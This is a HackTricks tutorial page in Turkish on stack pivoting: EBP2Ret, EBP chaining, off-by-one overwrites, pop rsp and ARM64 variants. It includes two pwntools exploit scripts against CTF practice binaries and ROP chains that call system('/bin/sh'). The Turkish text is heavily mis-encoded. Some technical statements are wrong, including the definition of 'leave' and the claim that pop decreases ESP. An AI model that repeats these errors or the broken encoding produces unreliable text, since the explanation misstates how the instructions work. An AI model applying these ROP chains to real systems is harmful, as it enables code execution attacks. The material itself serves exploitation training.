# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'i manipÃ¼le etme yeteneÄŸinden yararlanarak, EBP kaydÄ±nÄ±n dikkatli kullanÄ±mÄ± ve **`leave; ret`** talimat dizisi aracÄ±lÄ±ÄŸÄ±yla birden fazla iÅŸlevin yÃ¼rÃ¼tÃ¼lmesini zincirleme imkanÄ± saÄŸlar.

HatÄ±rlatmak gerekirse, **`leave`** temelde ÅŸunu ifade eder:
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

Bu teknik, **EBP kaydÄ±nÄ± deÄŸiÅŸtirebilirken EIP kaydÄ±nÄ± doÄŸrudan deÄŸiÅŸtirme yolunuz yoksa** Ã¶zellikle faydalÄ±dÄ±r. FonksiyonlarÄ±n Ã§alÄ±ÅŸmayÄ± bitirdiÄŸinde gÃ¶sterdiÄŸi davranÄ±ÅŸÄ± kullanÄ±r.

EÄŸer `fvuln`'Ä±n Ã§alÄ±ÅŸmasÄ± sÄ±rasÄ±nda, yÄ±ÄŸÄ±n iÃ§inde shellcode'unuzun adresine iÅŸaret eden bir **sahte EBP** enjekte etmeyi baÅŸarÄ±rsanÄ±z (artÄ± `pop` iÅŸlemi iÃ§in 4 byte ekleyerek), EIP'yi dolaylÄ± olarak kontrol edebilirsiniz. `fvuln` dÃ¶nerken, ESP bu hazÄ±rlanmÄ±ÅŸ konuma ayarlanÄ±r ve sonraki `pop` iÅŸlemi ESP'yi 4 azaltÄ±r, **etkili bir ÅŸekilde orada saldÄ±rgan tarafÄ±ndan saklanan bir adrese iÅŸaret eder.**\
**2 adresi bilmeniz gerektiÄŸini unutmayÄ±n**: ESP'nin gideceÄŸi yer ve ESP tarafÄ±ndan iÅŸaret edilen adresi yazmanÄ±z gereken yer.

#### Exploit Construction

Ã–ncelikle, **rastgele veri/adres yazabileceÄŸiniz bir adresi bilmeniz gerekir**. ESP buraya iÅŸaret edecek ve **ilk `ret`** Ã§alÄ±ÅŸtÄ±rÄ±lacak.

Sonra, **rastgele kod Ã§alÄ±ÅŸtÄ±racak** `ret` tarafÄ±ndan kullanÄ±lan adresi bilmeniz gerekir. ÅunlarÄ± kullanabilirsiniz:

* GeÃ§erli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresi.
* **`system()`** adresi, ardÄ±ndan **4 gereksiz byte** ve `"/bin/sh"` adresi (x86 bit).
* **`jump esp;`** gadget'Ä±nÄ±n adresi ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) ardÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lacak **shellcode**.
* BazÄ± [**ROP**](../rop-return-oriented-programing/) zincirleri.

KontrollÃ¼ bellek kÄ±smÄ±ndaki bu adreslerden Ã¶nce **`4` byte** bulunmasÄ± gerektiÄŸini unutmayÄ±n, Ã§Ã¼nkÃ¼ **`pop`** kÄ±smÄ± `leave` talimatÄ±nÄ±n bir parÃ§asÄ±dÄ±r. Bu 4B'yi kÃ¶tÃ¼ye kullanarak **ikinci sahte EBP** ayarlamak ve yÃ¼rÃ¼tmeyi kontrol etmeye devam etmek mÃ¼mkÃ¼n olacaktÄ±r.

#### Off-By-One Exploit

Bu tekniÄŸin "Off-By-One Exploit" olarak bilinen Ã¶zel bir varyantÄ± vardÄ±r. **EBP'nin en az anlamlÄ± byte'Ä±nÄ± yalnÄ±zca deÄŸiÅŸtirebildiÄŸinizde** kullanÄ±lÄ±r. BÃ¶yle bir durumda, **`ret`** ile atlanacak adresi saklayan bellek konumu EBP ile ilk Ã¼Ã§ byte'Ä± paylaÅŸmalÄ±dÄ±r, bu da daha kÄ±sÄ±tlÄ± koÅŸullarla benzer bir manipÃ¼lasyona izin verir.\
Genellikle, mÃ¼mkÃ¼n olduÄŸunca uzaÄŸa atlamak iÃ§in byte 0x00 deÄŸiÅŸtirilir.

AyrÄ±ca, yÄ±ÄŸÄ±nda bir RET sled kullanmak ve gerÃ§ek ROP zincirini en sona koymak yaygÄ±ndÄ±r, bÃ¶ylece yeni ESP'nin RET SLED iÃ§inde iÅŸaret etmesi ve son ROP zincirinin Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± daha olasÄ± hale gelir.

### **EBP Chaining**

Bu nedenle, yÄ±ÄŸÄ±nÄ±n `EBP` giriÅŸine kontrol edilen bir adres koyarak ve `EIP`'de `leave; ret` adresi koyarak, **`ESP`'yi yÄ±ÄŸÄ±ndan kontrol edilen `EBP` adresine taÅŸÄ±mak mÃ¼mkÃ¼ndÃ¼r**.

ArtÄ±k, **`ESP`** istenen bir adrese iÅŸaret ediyor ve yÃ¼rÃ¼tÃ¼lecek bir sonraki talimat bir `RET`. Bunu kÃ¶tÃ¼ye kullanmak iÃ§in, kontrol edilen ESP yerine ÅŸunlarÄ± yerleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r:

* **`&(next fake EBP)`** -> `leave` talimatÄ±ndan `pop ebp` nedeniyle yeni EBP'yi yÃ¼kle
* **`system()`** -> `ret` tarafÄ±ndan Ã§aÄŸrÄ±lÄ±r
* **`&(leave;ret)`** -> sistem sona erdikten sonra Ã§aÄŸrÄ±lÄ±r, ESP'yi sahte EBP'ye taÅŸÄ±r ve tekrar baÅŸlar
* **`&("/bin/sh")`**-> `system` iÃ§in parametre

Temelde bu ÅŸekilde, programÄ±n akÄ±ÅŸÄ±nÄ± kontrol etmek iÃ§in birkaÃ§ sahte EBP'yi zincirlemek mÃ¼mkÃ¼ndÃ¼r.

Bu, [ret2lib](../rop-return-oriented-programing/ret2lib/) gibidir, ancak gÃ¶rÃ¼nÃ¼r bir faydasÄ± olmadan daha karmaÅŸÄ±ktÄ±r, ancak bazÄ± kenar durumlarÄ±nda ilginÃ§ olabilir.

AyrÄ±ca, bu tekniÄŸi bir **stack leak** ile kazanan bir fonksiyonu Ã§aÄŸÄ±rmak iÃ§in kullanan bir [**challenge Ã¶rneÄŸi**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) var. Bu, sayfanÄ±n son yÃ¼klemesidir:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP kullanÄ±lmayabilir

[**Bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), eÄŸer bir ikili bazÄ± optimizasyonlarla derlenmiÅŸse, **EBP asla ESP'yi kontrol etmez**, bu nedenle EBP'yi kontrol ederek Ã§alÄ±ÅŸan herhangi bir istismar temelde baÅŸarÄ±sÄ±z olur Ã§Ã¼nkÃ¼ gerÃ§ek bir etkisi yoktur.\
Bu, **prolog ve epilog deÄŸiÅŸiklikleri** ikili optimize edildiÄŸinde gerÃ§ekleÅŸir.

* **Optimize edilmemiÅŸ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **Optimize edilmiÅŸ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP'yi Kontrol Etmenin DiÄŸer YollarÄ±

### **`pop rsp`** gadget

[**Bu sayfada**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) bu tekniÄŸi kullanan bir Ã¶rnek bulabilirsiniz. Bu zorluk iÃ§in 2 belirli argÃ¼manla bir fonksiyon Ã§aÄŸrÄ±lmasÄ± gerekiyordu ve bir **`pop rsp` gadget** vardÄ± ve **stack'ten bir leak** vardÄ±:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ret2esp tekniÄŸini burada kontrol edin:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## Referanslar ve DiÄŸer Ã–rnekler

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 bit, bir ret sled ile baÅŸlayan bir rop zinciri ile bir off by one istismarÄ±
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 bit, no relro, canary, nx ve pie. Program, yÄ±ÄŸÄ±n veya pie iÃ§in bir leak ve bir qword'un WWW'sini saÄŸlar. Ã–nce yÄ±ÄŸÄ±n leak'ini alÄ±n ve pie leak'ini geri almak iÃ§in WWW'yi kullanÄ±n. ArdÄ±ndan, `.fini_array` giriÅŸlerini kÃ¶tÃ¼ye kullanarak sonsuz bir dÃ¶ngÃ¼ oluÅŸturmak iÃ§in WWW'yi kullanÄ±n + `__libc_csu_fini` Ã§aÄŸrÄ±sÄ± ([daha fazla bilgi burada](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). Bu "sonsuz" yazmayÄ± kÃ¶tÃ¼ye kullanarak, .bss iÃ§inde bir ROP zinciri yazÄ±lÄ±r ve RBP ile pivotlama ile Ã§aÄŸrÄ±lÄ±r.

## ARM64

ARM64'te, fonksiyonlarÄ±n **prologlarÄ± ve epiloglarÄ±** **yÄ±ÄŸÄ±n iÃ§inde SP kaydÄ±nÄ± saklamaz ve geri almaz**. DahasÄ±, **`RET`** komutu SP tarafÄ±ndan iÅŸaret edilen adrese dÃ¶nmez, **`x30`** iÃ§indeki adrese dÃ¶ner.

Bu nedenle, varsayÄ±lan olarak, sadece epilogu kÃ¶tÃ¼ye kullanarak **SP kaydÄ±nÄ± kontrol edemezsiniz**. Ve SP'yi kontrol etmeyi baÅŸarÄ±rsanÄ±z bile, **`x30`** kaydÄ±nÄ± kontrol etmenin bir yoluna ihtiyacÄ±nÄ±z olacaktÄ±r.

*   prolog

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP Ã§erÃ§eve kaydÄ±na iÅŸaret eder
```
*   epilog

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
ARM64'te yÄ±ÄŸÄ±n pivotlamaya benzer bir ÅŸey gerÃ§ekleÅŸtirme yolu, **`SP`'yi kontrol edebilmek** (SP'ye geÃ§irilen bir kaydÄ± kontrol ederek veya bir nedenle SP'nin adresini yÄ±ÄŸÄ±ndan almasÄ± ve bir taÅŸma yaÅŸanmasÄ± durumunda) ve ardÄ±ndan **epilogu kÃ¶tÃ¼ye kullanarak** **kontrollÃ¼ bir `SP`'den** **`x30`** kaydÄ±nÄ± yÃ¼klemek ve **`RET`** ile ona dÃ¶nmektir.
{% endhint %}

AyrÄ±ca, aÅŸaÄŸÄ±daki sayfada **ARM64'teki Ret2esp** eÅŸdeÄŸerini gÃ¶rebilirsiniz:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
